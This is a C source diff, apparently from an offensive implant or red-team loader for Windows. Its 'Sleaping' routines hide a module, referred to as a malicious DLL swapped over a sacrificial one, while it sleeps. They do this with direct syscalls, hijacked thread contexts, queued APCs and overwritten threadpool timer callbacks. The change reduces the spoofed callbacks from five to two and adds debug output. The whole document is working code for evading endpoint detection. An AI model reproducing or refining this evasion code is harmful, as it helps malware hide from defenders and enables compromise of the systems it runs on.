@@ -2,6 +2,7 @@
 
 #include "syscalls.h"
 #include "globals.h"
+#include <inttypes.h>
 
 HANDLE SwapDll(SIZE_T MODULESIZE, PVOID SACDLLBASE) {
     
@@ -42,7 +43,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
 
 
     /* --------- HIDING --------- */
-    HANDLE hThreads[6] = { 0 };
+    HANDLE hThreads[3] = { 0 };
 
 
     //starting the APC trigger thread
@@ -76,7 +77,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
 
 
     // Create seven threads in suspended state
-    for (int i = 1; i < 6; ++i)
+    for (int i = 1; i < 3; ++i)
     {
         //does not really matter here the function the threads are going to execute
         if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreads[i], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
@@ -86,7 +87,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
     }
 
     // Modify the context of all the threads
-    for (int i = 1; i < 6; ++i)
+    for (int i = 1; i < 3; ++i)
     {
         // Initialize the context structure
         CtxHide[i].ContextFlags = CONTEXT_ALL;
@@ -113,31 +114,12 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
     CtxHide[2].R8 = (DWORD64)SafeCallback;
     CtxHide[2].R9 = (DWORD64)sizeof(PVOID);
 
-    *(ULONG_PTR*)((CtxHide[3]).Rsp) = (DWORD64)ExitThread;
-    CtxHide[3].Rip = (DWORD64)WriteProcessMemory;
-    CtxHide[3].Rcx = (DWORD64)(HANDLE)-1;
-    CtxHide[3].Rdx = (DWORD64) & (callbackinfo[2]->FinalizationCallback);
-    CtxHide[3].R8 = (DWORD64)SafeCallback;
-    CtxHide[3].R9 = (DWORD64)sizeof(PVOID);
-
-    *(ULONG_PTR*)((CtxHide[4]).Rsp) = (DWORD64)ExitThread;
-    CtxHide[4].Rip = (DWORD64)WriteProcessMemory;
-    CtxHide[4].Rcx = (DWORD64)(HANDLE)-1;
-    CtxHide[4].Rdx = (DWORD64) & (callbackinfo[3]->FinalizationCallback);
-    CtxHide[4].R8 = (DWORD64)SafeCallback;
-    CtxHide[4].R9 = (DWORD64)sizeof(PVOID);
-
-    *(ULONG_PTR*)((CtxHide[5]).Rsp) = (DWORD64)ExitThread;
-    CtxHide[5].Rip = (DWORD64)WriteProcessMemory;
-    CtxHide[5].Rcx = (DWORD64)(HANDLE)-1;
-    CtxHide[5].Rdx = (DWORD64) & (callbackinfo[4]->FinalizationCallback);
-    CtxHide[5].R8 = (DWORD64)SafeCallback;
-    CtxHide[5].R9 = (DWORD64)sizeof(PVOID);
+   
 
 
 
     // Set the new context to all the threads
-    for (int i = 1; i < 6; ++i)
+    for (int i = 1; i < 3; ++i)
     {
         // Initialize the context structure
         if (!NT_SUCCESS(ntFunctions->NtSetContextThread(hThreads[i], &CtxHide[i])))
@@ -148,7 +130,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
     }
 
     //queue the APC threads to the worker thread
-    for (int i = 0; i < 5; i++) {
+    for (int i = 0; i < 2; i++) {
         if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(hThreads[0], (PPS_APC_ROUTINE)ResumeThread, hThreads[i + 1], FALSE, NULL))) {
             return -1;
         }
@@ -160,7 +142,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
 
 
     /* --------- FIXING --------- */
-    HANDLE hThreadsFix[6] = { 0 };
+    HANDLE hThreadsFix[3] = { 0 };
 
     //starting the APC trigger thread
     if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreadsFix[0], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
@@ -192,7 +174,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
     }
 
     // Create seven threads in suspended state
-    for (int i = 1; i < 6; ++i)
+    for (int i = 1; i < 3; ++i)
     {
         //does not really matter here the function the threads are going to execute
         if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreadsFix[i], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
@@ -202,7 +184,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
     }
 
     // Modify the context of all the threads
-    for (int i = 1; i < 6; ++i)
+    for (int i = 1; i < 3; ++i)
     {
         // Initialize the context structure
         CtxFix[i].ContextFlags = CONTEXT_ALL;
@@ -227,31 +209,10 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
     CtxFix[2].R8 = (DWORD64)ResumeThreadValue;
     CtxFix[2].R9 = (DWORD64)sizeof(PVOID);
 
-    *(ULONG_PTR*)((CtxFix[3]).Rsp) = (DWORD64)ExitThread;
-    CtxFix[3].Rip = (DWORD64)WriteProcessMemory;
-    CtxFix[3].Rcx = (DWORD64)(HANDLE)-1;
-    CtxFix[3].Rdx = (DWORD64) & (callbackinfo[2]->FinalizationCallback);
-    CtxFix[3].R8 = (DWORD64)ResumeThreadValue;
-    CtxFix[3].R9 = (DWORD64)sizeof(PVOID);
-
-    *(ULONG_PTR*)((CtxFix[4]).Rsp) = (DWORD64)ExitThread;
-    CtxFix[4].Rip = (DWORD64)WriteProcessMemory;
-    CtxFix[4].Rcx = (DWORD64)(HANDLE)-1;
-    CtxFix[4].Rdx = (DWORD64) & (callbackinfo[3]->FinalizationCallback);
-    CtxFix[4].R8 = (DWORD64)ResumeThreadValue;
-    CtxFix[4].R9 = (DWORD64)sizeof(PVOID);
-
-    *(ULONG_PTR*)((CtxFix[5]).Rsp) = (DWORD64)ExitThread;
-    CtxFix[5].Rip = (DWORD64)WriteProcessMemory;
-    CtxFix[5].Rcx = (DWORD64)(HANDLE)-1;
-    CtxFix[5].Rdx = (DWORD64) & (callbackinfo[4]->FinalizationCallback);
-    CtxFix[5].R8 = (DWORD64)ResumeThreadValue;
-    CtxFix[5].R9 = (DWORD64)sizeof(PVOID);
-
 
 
     // Set the new context to all the threads
-    for (int i = 1; i < 6; ++i)
+    for (int i = 1; i < 3; ++i)
     {
         // Initialize the context structure
         if (!NT_SUCCESS(ntFunctions->NtSetContextThread(hThreadsFix[i], &CtxFix[i])))
@@ -262,7 +223,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
     }
 
     //queue the APC threads to the worker thread
-    for (int i = 0; i < 5; i++) {
+    for (int i = 0; i < 2; i++) {
         if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(hThreadsFix[0], (PPS_APC_ROUTINE)ResumeThread, hThreadsFix[i + 1], FALSE, NULL))) {
             return -1;
         }
@@ -274,9 +235,9 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
     }
 
     //for loop that adds both Thread and ThreadFix to the array of apcThreads
-    for (int i = 0; i < 6; i++) {
+    for (int i = 0; i < 3; i++) {
         apcThreads[i] = hThreads[i];
-        apcThreads[i + 6] = hThreadsFix[i];
+        apcThreads[i + 3] = hThreadsFix[i];
     }
 
     return 0;
@@ -295,7 +256,10 @@ int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, i
     SIZE_T len = 0;
     TPP_CLEANUP_GROUP_MEMBER ctx = { 0 };
     HMODULE hNtdll = { 0 };
-
+    INT64 highest = 0;
+    INT64 second_highest = 0;
+	int index_highest = 0;
+	int index_second_highest = 0;
 
     if (!(hNtdll = GetModuleHandleA("ntdll"))) {
         return -1;
@@ -327,20 +291,36 @@ int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, i
         PLIST_ENTRY pHead = tp_timer.WindowStartLinks.Children.Flink;
         PLIST_ENTRY pFwd = tp_timer.WindowStartLinks.Children.Flink;
         LIST_ENTRY entry = { 0 };
-
+        
         do {
 
             if (ReadProcessMemory(GetCurrentProcess(), tp_timer.Work.CleanupGroupMember.Context, &ctx, sizeof(TPP_CLEANUP_GROUP_MEMBER), &len) == FALSE) {
                 break;
             }
+            //print all the tp_timer members 
+            
+            
 
             if ((ctx).FinalizationCallback == ResumeThreadAddress) {
+                printf("[!] DueTimer %" PRIu64 " with address %p\n", tp_timer.DueTime, tp_timer.Work.CleanupGroupMember.Context);
+                if (tp_timer.DueTime > highest) {
+					second_highest = highest;
+					highest = tp_timer.DueTime;
+					
+					callbackArray[0] = (PTPP_CLEANUP_GROUP_MEMBER)tp_timer.Work.CleanupGroupMember.Context; //address of the object
 
-                callbackArray[*arraySize] = (PTPP_CLEANUP_GROUP_MEMBER)tp_timer.Work.CleanupGroupMember.Context; //address of the object
 
+				}
+                else if (tp_timer.DueTime > second_highest && tp_timer.DueTime <= highest) {
+                    second_highest = tp_timer.DueTime;
+					callbackArray[1] = (PTPP_CLEANUP_GROUP_MEMBER)tp_timer.Work.CleanupGroupMember.Context; //address of the object
+                }
+
+               
                 (*arraySize)++;
 
             }
+			
 
 
             p_tp_timer = CONTAINING_RECORD(pFwd, FULL_TP_TIMER, WindowStartLinks);
@@ -354,6 +334,9 @@ int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, i
         } while (pHead != pFwd);
 
     }
+    //print highest and second highest due time
+    printf("[!] Highest DueTime %" PRIu64 " with address: %p\n", highest, callbackArray[0]);
+    printf("[!] Second Highest DueTime %" PRIu64 " with address %p\n", second_highest, callbackArray[1]);
 
     return 0;
 
@@ -461,13 +444,13 @@ int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMB
 int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize, PNT_FUNCTIONS ntFunctions, PFUNCTION_ADDRESSES fnAddr) {
 
     //APC Threads
-    PHANDLE ApcThreads = (PHANDLE)(VirtualAlloc(NULL, 12 * sizeof(HANDLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    PHANDLE ApcThreads = (PHANDLE)(VirtualAlloc(NULL, 6 * sizeof(HANDLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
     //Context APC threads
-    CONTEXT* CtxHide = (CONTEXT*)(VirtualAlloc(NULL, 6 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    CONTEXT* CtxHide = (CONTEXT*)(VirtualAlloc(NULL, 3 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
     //context APC threads fix callback
-    CONTEXT* CtxFix = (CONTEXT*)(VirtualAlloc(NULL, 6 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    CONTEXT* CtxFix = (CONTEXT*)(VirtualAlloc(NULL, 3 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
     //events for APC threads
     HANDLE   EvntHide = { 0 };
@@ -477,16 +460,16 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     HMODULE hNtdll = { 0 };
 
     //callbackArray for APC to spoof
-    PTPP_CLEANUP_GROUP_MEMBER* callbackArray = (PTPP_CLEANUP_GROUP_MEMBER*)VirtualAlloc(NULL, 5 * sizeof(PTPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    PTPP_CLEANUP_GROUP_MEMBER* callbackArray = (PTPP_CLEANUP_GROUP_MEMBER*)VirtualAlloc(NULL, 2 * sizeof(PTPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     PDWORD64 ResumeThreadValue = (PDWORD64)VirtualAlloc(NULL, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     PDWORD64 SafeCallback = (PDWORD64)VirtualAlloc(NULL, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     //initializing callback array structs
-    for (int i = 0; i < 5; i++) {
+    for (int i = 0; i < 2; i++) {
         callbackArray[i] = (PTPP_CLEANUP_GROUP_MEMBER)VirtualAlloc(NULL, sizeof(TPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     }
 
-    //sleaping threads = 5 Timers + 12 APC threads
-    HANDLE ThreadArray[17] = { NULL };
+    //sleaping threads = 5 Timers + 6 APC threads
+    HANDLE ThreadArray[11] = { NULL };
 
     //timers variables
     HANDLE  hTimerQueue = NULL;
@@ -616,10 +599,10 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
             if (SleapingAPCNG(callbackArray, &EvntHide, &DummyEvent, ApcThreads, CtxHide, CtxFix, ResumeThreadValue, SafeCallback, ntFunctions, fnAddr) == 0) {
 
                 int counter = 5;
-                for (int i = 0; i < 12; i++) {
+                for (int i = 0; i < 6; i++) {
 
                     //adding the newly created APC threads to the thread array to be waiting for
-                    ThreadArray[counter] = ApcThreads[i];//5 + 12
+                    ThreadArray[counter] = ApcThreads[i];//5 + 6
                     counter++;
 
                 }
@@ -636,7 +619,7 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
         return -1;
     }
 
-    if (WaitForMultipleObjects(17, ThreadArray, TRUE, INFINITE) == WAIT_FAILED) {
+    if (WaitForMultipleObjects(11, ThreadArray, TRUE, INFINITE) == WAIT_FAILED) {
         return -1;
     }
 
@@ -651,7 +634,7 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     if (contextC) VirtualFree(contextC, 0, MEM_RELEASE);
     if (contextD) VirtualFree(contextD, 0, MEM_RELEASE);
     if (contextE) VirtualFree(contextE, 0, MEM_RELEASE);
-    for (int i = 0; i < 5; i++) {
+    for (int i = 0; i < 2; i++) {
         if (callbackArray[i] != NULL) {
             VirtualFree(callbackArray[i], 0, MEM_RELEASE);
         }
